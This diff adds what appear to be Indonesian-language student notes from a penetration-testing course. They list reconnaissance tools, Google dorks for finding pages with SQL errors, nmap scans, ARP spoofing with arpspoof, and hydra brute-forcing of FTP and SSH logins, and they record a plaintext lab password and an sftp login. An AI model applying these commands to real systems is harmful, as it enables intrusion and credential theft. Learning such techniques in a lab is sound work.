@@ -1,0 +1,77 @@
+gather information
+
+traceroute cari ip yang di ping secara bridging
+dig cari domain untuk module sendiri NS asli (network server)
+
+nslookup melihat NS
+
+dnsmap mapping dns dari domain
+
+theHarvester untuk 
+theHarvester -d binus -b google,bing -l 200 
+sama kaya sublister
+
+googledorcking
+
+inurl:x
+intitle:x
+x filetype:pdf
+"x"
+intext:"x"
+
+inurl:"product.php?id=" & intext:"you have an error in your SQL syntax"
+
+#Session 2
+
+nmap [ip kita ]/24
+nmap -T4 -sV -p- -O -osscan-guess ip
+
+dirbuster
+
+sudo su *
+
+gobuster dir -u [url] -w [wordlist] -x [typedata]
+
+nikto = cek web sudah bisa tembus atau belum?
+
+#Session 3
+
+wireshark {
+
+statistic -> protocol-> select as  -> dns
+
+}
+
+//// download ubuntu client *
+
+
+arp -> translate ip ke mac address
+
+arpspoofing
+1. target
+2. ganti mac addressnya ke target
+
+
+sudo arpspoof -i eth0 -t [target[ip] -> ip kita sekarang ] 
+
+
+#session 4
+
+
+cek network (nmap)
+
+ftp dari si target
+
+anonymous
+
+setelah itu 
+
+hydra -l [username] -P [wordlist] ftp://[target ip]
+
+BHRQvc7hYqDm -> passwordnya
+
+ssh berguna untuk langsung remote (kek laptop dewek)
+
+hydra -l [username] -P [wordlist] ssh://[target ip]
+
+sftp phrary@192.168.54.132
